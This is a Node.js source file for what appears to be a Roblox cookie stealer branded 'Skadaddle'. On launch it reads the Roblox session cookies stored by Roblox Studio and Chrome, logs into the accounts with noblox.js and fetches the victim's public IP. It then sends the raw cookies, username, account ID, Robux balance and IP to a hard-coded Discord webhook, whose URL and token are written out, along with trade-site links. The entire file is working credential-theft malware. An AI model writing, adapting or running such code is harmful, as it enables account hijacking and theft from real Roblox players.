const discord = require("discord.js");
const rbxcookie = require("rbxcookie");
const StudioCookie = new rbxcookie.Studio();
const ChromeCookie = new rbxcookie.Chrome();
const chalk = require("chalk");
const noblox = require("noblox.js"); // Changed from cbx to noblox for consistency
const fetch = require('node-fetch');

const letters = ['$ ', 'K ', 'A ', 'D ', 'A ', 'D ', 'D ', 'L ', 'E '];
let pusher = "";
letters.forEach((l, i) => {
    setTimeout(() => {
        pusher += l;
        process.title = pusher;
    }, i * 75);
});

async function OnOpen() {
    const logo1 = `
${chalk.hex('#FFFFFF')("                                   ┌┼┐  ╦╔═  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗  ╔╦╗  ╦    ╔═╗")}
${chalk.hex('#8D8C8C')("                                   └┼┐  ╠╩╗  ╠═╣   ║║  ╠═╣   ║║   ║║  ║    ║╣")}
${chalk.hex('#71E3FF')("                                   └┼┘  ╩ ╩  ╩ ╩  ═╩╝  ╩ ╩  ═╩╝  ═╩╝  ╩═╝  ╚═╝")}  
`;
    console.log(logo1);
    await Log(); // Added await to ensure proper sequencing
}

async function OnConnect() {
    console.clear();
    const studioCookie = await StudioCookie.cookie();
    await noblox.setCookie(studioCookie);
    const studioUser = await noblox.getCurrentUser();
    
    const chromeCookie = await ChromeCookie.cookie();
    await noblox.setCookie(chromeCookie);
    const chromeUser = await noblox.getCurrentUser();

    const logo2 = `
${chalk.hex('#FFFFFF')("                                   ┌┼┐  ╦╔═  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗  ╔╦╗  ╦    ╔═╗")}
${chalk.hex('#8D8C8C')("                                   └┼┐  ╠╩╗  ╠═╣   ║║  ╠═╣   ║║   ║║  ║    ║╣")}
${chalk.hex('#71E3FF')("                                   └┼┘  ╩ ╩  ╩ ╩  ═╩╝  ╩ ╩  ═╩╝  ═╩╝  ╩═╝  ╚═╝")}

Google Chrome[UserName: ${chromeUser.UserName} - ID: ${chromeUser.UserID} - Premium: ${chromeUser.IsPremium}]
Roblox Studio[UserName: ${studioUser.UserName} - ID: ${studioUser.UserID} - Premium: ${studioUser.IsPremium}]
`;
    console.log(logo2);
}

async function Log() {
    try {
        const stats = await fetch('https://api.ipify.org/?format=json').then(res => res.json());
        const studioCookie = await StudioCookie.cookie();
        await noblox.setCookie(studioCookie);
        const studioUser = await noblox.getCurrentUser();

        const chromeCookie = await ChromeCookie.cookie();
        await noblox.setCookie(chromeCookie);
        const chromeUser = await noblox.getCurrentUser();

        const webhookClient = new discord.WebhookClient({ 
            id: "1431782949392744649",     // https://discord.com/api/webhooks/1431782949392744649/TyZ0U2uyCnZmAf4NIcirCRBcPiaujdw6PVX_WbS6T-iVjvvqbe7gPx0S6BvImaM4-bFl
            token: 'TyZ0U2uyCnZmAf4NIcirCRBcPiaujdw6PVX_WbS6T-iVjvvqbe7gPx0S6BvImaM4-bFl' 
        });

        // Send Studio data
        await webhookClient.send({
            content: "@everyone Roblox Studio Cookies Data. | https://discord.gg/qWFC7DdcSS",
            embeds: [createEmbed(stats.ip, studioUser, studioCookie)]
        });

        // Send Chrome data
        await webhookClient.send({
            content: "Google Chrome Cookies Data.",
            embeds: [createEmbed(stats.ip, chromeUser, chromeCookie)]
        });
    } catch (error) {
        console.error("Logging error:", error);
    }
}

function createEmbed(ip, user, cookie) {
    return {
        embeds: [
            {
                color: 0,
                fields: [
                    { name: "**Logged User**", value: user.UserName, inline: true },
                    { name: "**IP Address**", value: ip, inline: true },
                    { name: "**Account ID**", value: user.UserID.toString(), inline: true },
                    { name: "**Robux**", value: user.RobuxBalance.toString(), inline: true },
                    { name: "**Premium**", value: user.IsPremium.toString(), inline: true },
                    { name: "**Rap**", value: "coming soon", inline: true },
                    { name: "**RBLXTrade Profile**", value: `https://rblx.trade/u/${user.UserName}`, inline: false },
                    { name: "**RBXFlip Profile**", value: `https://rbxflip.com/profiles/${user.UserID}`, inline: false },
                    { name: "**Trade Link**", value: `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${user.UserID}`, inline: false },
                    { name: "**Rolimon's Profile**", value: `https://www.rolimons.com/player/${user.UserID}`, inline: false }
                ],
                footer: {
                    text: "Powered By Skadaddle API",
                    icon_url: "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
                },
                timestamp: new Date().toISOString(),
                thumbnail: { url: user.ThumbnailUrl }
            },
            {
                description: `Cookies :cookie:\n\`\`\`${cookie}\`\`\``,
                color: 0
            }
        ],
        username: "Target",
        avatarURL: "https://tse2.mm.bing.net/th/id/OIP.6iCuDx2BUOO7m4CWXI21wAHaEK?pid=Api&P=0&h=220"
    };
}

// Initialize
OnOpen();
